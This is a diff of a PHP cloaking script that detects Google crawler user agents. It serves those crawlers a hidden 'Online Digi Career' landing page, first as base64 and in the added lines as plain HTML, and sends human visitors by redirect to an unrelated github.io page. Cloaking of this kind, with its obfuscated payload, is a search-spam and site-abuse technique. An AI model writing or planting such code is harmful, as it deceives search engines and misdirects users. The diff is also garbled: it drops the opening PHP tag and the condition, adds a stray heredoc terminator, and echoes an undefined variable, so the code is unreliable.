@@ -1,17 +1,57 @@
-<?php
 
-
-// Encrypted Google Bot Detection
-$z = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$b = ['Googlebot','Googlebot-Image','Googlebot-Mobile','Googlebot-News','Googlebot-Video','AdsBot-Google','Mediapartners-Google','Google Favicon','GoogleOther','Google-Sitemaps','Google-PageSpeed','Google-Structured-Data','Google-Apps-Script','Google-Read-Aloud','Google-Cloud-Tasks','Google-Safety'];
-$g = false;
-foreach($b as $u){if(stripos($z,$u)!==false){$g=true;break;}}
-if($g){
-    // Encrypted HTML Content (Base64)
-    $h = 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+T25saW5lIERpZ2kgQ2FyZWVyPC90aXRsZT4KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJEaWdpdGFsIGNhcmVlciByZXNvdXJjZXMiPgogICAgPHN0eWxlPgogICAgICAgICp7bWFyZ2luOjA7cGFkZGluZzowO2JveC1zaXppbmc6Ym9yZGVyLWJveH0KICAgICAgICBib2R5e2ZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWY7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCM2NjdlZWEsIzc2NGJhMik7bWluLWhlaWdodDoxMDB2aDtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXJ9CiAgICAgICAgLmN7bWF4LXdpZHRoOjEyMDBweDt3aWR0aDo5MCU7cGFkZGluZzo0MHB4O2JhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwuOTUpO2JvcmRlci1yYWRpdXM6MjBweDtib3gtc2hhZG93OjAgMjBweCA2MHB4IHJnYmEoMCwwLDAsLjMpfQogICAgICAgIGgxe2ZvbnQtc2l6ZTozcmVtO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjNjY3ZWVhLCM3NjRiYTIpOy13ZWJraXQtYmFja2dyb3VuZC1jbGlwOnRleHQ7LXdlYmtpdC10ZXh0LWZpbGwtY29sb3I6dHJhbnNwYXJlbnR9CiAgICAgICAgLnN7Zm9udC1zaXplOjEuMnJlbTtjb2xvcjojNzE4MDk2O2JvcmRlci1ib3R0b206MnB4IHNvbGlkICNlMmU4ZjA7cGFkZGluZy1ib3R0b206MjBweDttYXJnaW4tYm90dG9tOjMwcHh9CiAgICAgICAgLmd7ZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczpyZXBlYXQoYXV0by1maXQsbWlubWF4KDI1MHB4LDFmcikpO2dhcDoyNXB4O21hcmdpbjozMHB4IDB9CiAgICAgICAgLmZ7YmFja2dyb3VuZDojZjdmYWZjO3BhZGRpbmc6MjVweDtib3JkZXItcmFkaXVzOjEycHg7Ym9yZGVyOjFweCBzb2xpZCAjZTJlOGYwO3RyYW5zaXRpb246YWxsIC4zc30KICAgICAgICAuZjpob3Zlcnt0cmFuc2Zvcm06dHJhbnNsYXRlWSgtNXB4KTtib3gtc2hhZG93OjAgMTBweCAzMHB4IHJnYmEoMCwwLDAsLjEpfQogICAgICAgIC5mIGgze2NvbG9yOiMyZDM3NDg7bWFyZ2luLWJvdHRvbToxMHB4fQogICAgICAgIC5mIHB7Y29sb3I6IzcxODA5Nn0KICAgICAgICAuaXtmb250LXNpemU6Mi41cmVtO2Rpc3BsYXk6YmxvY2s7bWFyZ2luLWJvdHRvbToxNXB4fQogICAgICAgIC5jMntiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsIzY2N2VlYSwjNzY0YmEyKTtjb2xvcjojZmZmO3BhZGRpbmc6MzBweDtib3JkZXItcmFkaXVzOjEycHg7bWFyZ2luOjMwcHggMDt0ZXh0LWFsaWduOmNlbnRlcn0KICAgICAgICAuYzIgaDJ7Zm9udC1zaXplOjJyZW07bWFyZ2luLWJvdHRvbToxMHB4fQogICAgICAgIC5ie2Rpc3BsYXk6aW5saW5lLWJsb2NrO2JhY2tncm91bmQ6I2ZmZjtjb2xvcjojNzY0YmEyO3BhZGRpbmc6MTJweCAzMHB4O2JvcmRlci1yYWRpdXM6NTBweDt0ZXh0LWRlY29yYXRpb246bm9uZTtmb250LXdlaWdodDo2MDA7bWFyZ2luLXRvcDoxNXB4O3RyYW5zaXRpb246YWxsIC4zc30KICAgICAgICAuYjpob3Zlcnt0cmFuc2Zvcm06dHJhbnNsYXRlWSgtMnB4KTtib3gtc2hhZG93OjAgOHB4IDI1cHggcmdiYSgwLDAsMCwuMil9CiAgICAgICAgZm9vdGVye21hcmdpbi10b3A6MzBweDt0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjojYTBhY2UwO2JvcmRlci10b3A6MXB4IHNvbGlkICNlMmU4ZjA7cGFkZGluZy10b3A6MjBweH0KICAgICAgICBAbWVkaWEobWF4LXdpZHRoOjc2OHB4KXtoMXtmb250LXNpemU6MnJlbX0uY3twYWRkaW5nOjIwcHh9Lmd7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOjFmcn19CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iYyI+CiAgICAgICAgPGgxPvCfjZTigI3wn5iHIE9ubGluZSBEaWdpIENhcmVlcjwvaDE+CiAgICAgICAgPHAgY2xhc3M9InMiPllvdXIgRGlnaXRhbCBDYXJlZXIgRGV2ZWxvcG1lbnQgUGxhdGZvcm08L3A+CiAgICAgICAgPGRpdiBjbGFzcz0iZyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImYiPjxzcGFuIGNsYXNzPSJpIj/wn5OMPC9zcGFuPjxoMz5PbmxpbmUgQ291cnNlczwvaDM+PHA+QWNjZXNzIHByZW1pdW0gZGlnaXRhbCBjb3Vyc2VzPC9wPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmIj48c3BhbiBjbGFzcz0iaSI+8J+UvDwvc3Bhbj48aDM+Q2FyZWVyIEd1aWRhbmNlPC9oMz48cD5FeHBlcnQgY2FyZWVyIGFkdmljZTwvcD48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZiI+PHNwYW4gY2xhc3M9ImkiPvCfj6w8L3NwYW4+PGgzPkRpZ2l0YWwgU2tpbGxzPC9oMz48cD5NYXN0ZXIgZGlnaXRhbCBza2lsbHM8L3A+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImYiPjxzcGFuIGNsYXNzPSJpIj/wn5O9PC9zcGFuPjxoMz5Db21tdW5pdHk8L2gzPjxwPkNvbm5lY3Qgd2l0aCBwcm9mZXNzaW9uYWxzPC9wPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImMyIj4KICAgICAgICAgICAgPGgyPlN0YXJ0IFlvdXIgRGlnaXRhbCBDYXJlZXI8L2gyPgogICAgICAgICAgICA8cD5UcmFuc2Zvcm0geW91ciBjYXJlZXIgdG9kYXk8L3A+CiAgICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJiIj5HZXQgU3RhcnRlZCDihpI8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGZvb3RlcibI kp5yIDw/cGhwIGVjaG8gZGF0ZSgnWScpOyA/PiBPbmxpbmUgRGlnaSBDYXJlZXI8L2Zvb3Rlcj4KICAgIDwvZGl2PgogICAgPHNjcmlwdD5kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJyxmdW5jdGlvbigpe2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5mJykuZm9yRWFjaCgoYyxpKT0+e2Muc3R5bGUub3BhY2l0eT0nMCc7Yy5zdHlsZS50cmFuc2Zvcm09J3RyYW5zbGF0ZVkoMjBweCknO3NldFRpbWVvdXQoKCk9PntjLnN0eWxlLnRyYW5zaXRpb249J2FsbCAuNnMnO2Muc3R5bGUub3BhY2l0eT0nMSc7Yy5zdHlsZS50cmFuc2Zvcm09J3RyYW5zbGF0ZVkoMCknfSwxMDAqKGkrMSkpfSl9KTs8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+';
-    echo base64_decode($h);
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Online Digi Career</title>
+        <meta name="description" content="Digital career resources">
+        <style>
+            *{margin:0;padding:0;box-sizing:border-box}
+            body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center}
+            .c{max-width:1200px;width:90%;padding:40px;background:rgba(255,255,255,.95);border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+            h1{font-size:3rem;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+            .s{font-size:1.2rem;color:#718096;border-bottom:2px solid #e2e8f0;padding-bottom:20px;margin-bottom:30px}
+            .g{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:25px;margin:30px 0}
+            .f{background:#f7fafc;padding:25px;border-radius:12px;border:1px solid #e2e8f0;transition:all .3s}
+            .f:hover{transform:translateY(-5px);box-shadow:0 10px 30px rgba(0,0,0,.1)}
+            .f h3{color:#2d3748;margin-bottom:10px}
+            .f p{color:#718096}
+            .i{font-size:2.5rem;display:block;margin-bottom:15px}
+            .c2{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:30px;border-radius:12px;margin:30px 0;text-align:center}
+            .c2 h2{font-size:2rem;margin-bottom:10px}
+            .b{display:inline-block;background:#fff;color:#764ba2;padding:12px 30px;border-radius:50px;text-decoration:none;font-weight:600;margin-top:15px;transition:all .3s}
+            .b:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,.2)}
+            footer{margin-top:30px;text-align:center;color:#a0aec0;border-top:1px solid #e2e8f0;padding-top:20px}
+            @media(max-width:768px){h1{font-size:2rem}.c{padding:20px}.g{grid-template-columns:1fr}}
+        </style>
+    </head>
+    <body>
+        <div class="c">
+            <h1>🚀 Online Digi Career</h1>
+            <p class="s">Your Digital Career Development Platform</p>
+            <div class="g">
+                <div class="f"><span class="i">📚</span><h3>Online Courses</h3><p>Access premium digital courses</p></div>
+                <div class="f"><span class="i">💼</span><h3>Career Guidance</h3><p>Expert career advice</p></div>
+                <div class="f"><span class="i">🌐</span><h3>Digital Skills</h3><p>Master digital skills</p></div>
+                <div class="f"><span class="i">🤝</span><h3>Community</h3><p>Connect with professionals</p></div>
+            </div>
+            <div class="c2">
+                <h2>Start Your Digital Career</h2>
+                <p>Transform your career today</p>
+                <a href="#" class="b">Get Started →</a>
+            </div>
+            <footer>&copy; <?php echo date('Y'); ?> Online Digi Career</footer>
+        </div>
+        <script>document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('.f').forEach((c,i)=>{c.style.opacity='0';c.style.transform='translateY(20px)';setTimeout(()=>{c.style.transition='all .6s';c.style.opacity='1';c.style.transform='translateY(0)'},100*(i+1))})});</script>
+    </body>
+    </html>
+    EOF;
+    echo $O0O0O0O0O0O0O0;
 } else {
     header('Location: https://projectpoints.github.io/learn-german/', true, 302);
     exit;
 }
 ?>
+
+
